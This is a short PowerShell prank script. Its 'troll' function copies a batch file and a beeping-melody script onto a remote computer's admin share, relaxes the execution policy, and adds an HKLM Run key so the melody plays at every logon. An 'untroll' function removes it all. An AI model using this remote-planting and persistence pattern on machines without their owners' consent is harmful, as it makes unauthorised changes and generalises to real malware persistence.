function troll {
    param (
        $computername
    )

    New-Item \\$computername\c$\Users\Public\startup.bat | Out-Null
    Add-Content -Path "\\$computername\c$\Users\Public\startup.bat" -Value "@echo off
    powershell Set-ExecutionPolicy RemoteSigned -scope CurrentUser
    powershell C:\Users\Public\trollage.ps1"

    New-Item \\$computername\c$\Users\Public\trollage.ps1 | Out-Null
    Add-Content -Path "\\$computername\c$\Users\Public\trollage.ps1" -Value "[console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(932,150)
    Start-Sleep -m 150
    [console]::beep(1047,150)
    Start-Sleep -m 150
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(699,150)
    Start-Sleep -m 150
    [console]::beep(740,150)
    Start-Sleep -m 150
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(932,150)
    Start-Sleep -m 150
    [console]::beep(1047,150)
    Start-Sleep -m 150
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(784,150)
    Start-Sleep -m 300
    [console]::beep(699,150)
    Start-Sleep -m 150
    [console]::beep(740,150)
    Start-Sleep -m 150
    [console]::beep(932,150)
    [console]::beep(784,150)
    [console]::beep(587,1200)
    Start-Sleep -m 75
    [console]::beep(932,150)
    [console]::beep(784,150)
    [console]::beep(554,1200)
    Start-Sleep -m 75
    [console]::beep(932,150)
    [console]::beep(784,150)
    [console]::beep(523,1200)
    Start-Sleep -m 150
    [console]::beep(466,150)
    [console]::beep(523,150)"

    Invoke-Command $computername {New-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -PropertyType string -name Startup -Value "C:\Users\Public\startup.bat" | Out-Null}
    "$computername has been trolled."
}

function untroll {
    param (
        $computername
    )
    Remove-Item \\$computername\c$\Users\Public\startup.bat
    Remove-Item \\$computername\c$\Users\Public\trollage.ps1

    Invoke-Command $computername {Remove-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -name Startup}
    "$computername has been untrolled."
}